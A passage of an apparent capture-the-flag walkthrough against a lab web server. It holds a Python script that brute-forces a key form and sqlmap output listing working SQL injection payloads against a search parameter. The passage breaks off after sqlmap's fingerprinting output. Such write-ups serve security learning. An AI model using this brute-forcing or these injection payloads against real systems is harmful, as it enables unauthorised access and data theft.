&lt;p&gt;If we put this at the end of our url with land on another page. Dirbuster will
never have find something like that!&lt;/p&gt;
&lt;p&gt;It is a simple web page asking us for a key. When looking at the page code we
notice:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;!-- this form isn't connected to mysql, password ain't that complex --!&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If there is no SQL injection and the password is simple we need to bruteforce it.
I am not a huge fan of bruteforce but I wrote a simple script that use one of my
password dictionary (mostly common word).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://192.168.0.20/kzMb5nVYJw/index.php&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/share/dict/cracklib-small&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;invalid&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The password was "elite" and by entering it, we land on a new page.&lt;/p&gt;
&lt;h3 id="420searchphp"&gt;420search.php&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;420search.php&lt;/code&gt; page let us query for an user. If we search 'plop' we got:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fetched data successfully&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we search nothing we got:&lt;/p&gt;
&lt;p&gt;:::text
   EMP ID :1
   EMP NAME : ramses
   EMP POSITION :&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;EMP ID :2
   EMP NAME : isis
   EMP POSITION : employee&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Fetched data successfully&lt;/p&gt;
&lt;p&gt;This time it is probably a SQL injection as there is no mention against it in
the source code :D. If we introduce a double quote we got:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Could not get data: You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right syntax to use near
'%"' at line 1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It looks like an SQL injection.&lt;/p&gt;
&lt;h3 id="sqli"&gt;SQLi&lt;/h3&gt;
&lt;p&gt;Let us launch &lt;a href="http://sqlmap.org"&gt;sqlmap&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@rootine sqlmap&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;___&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;___&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_____&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;___&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;___&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e8f87bf&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;| . |&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;|___|_  |_|_|_|_|__,|  _|&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;      |_|           |_|   http://sqlmap.org&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="s1"&gt;[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;responsibility&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;obey&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;all&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;applicable&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;state&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;federal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;laws&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Developers&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;assume&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;no&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;liability&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;are&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;responsible&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;misuse&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;damage&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;caused&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;*&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;starting&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;15:25:23&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;resuming&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;back&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DBMS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;15:25:23&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;testing&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;connection&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;identified&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;following&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;injection&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;points&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HTTP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;requests&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;Parameter&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;usrtosearch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;boolean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;OR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;boolean&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;based&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;blind&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;HAVING&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;clause&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;comment&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;usrtosearch&lt;/span&gt;&lt;span class="o"&gt;=-&lt;/span&gt;&lt;span class="mi"&gt;8936&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot; OR 8832=8832#&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;    Type: AND/OR time-based blind&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="ss"&gt;    Payload: usrtosearch=plop&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SLEEP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;&lt;span class="n"&gt;bhRc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;Title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;usrtosearch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;plop&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;UNION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;ALL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;CONCAT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x71706b7871&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x5355686d62645446514a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x7162716271&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;15:25:23&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;back&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DBMS&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;operating&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;system&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Debian&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;technology&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Apache&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.4.10&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;back&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;DBMS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;5.0.12&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;15:25:23&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;INFO&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fetched&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;logged&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nc"&gt;text&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;under&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/home/maggick/.sqlmap/output/192.168.0.20&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
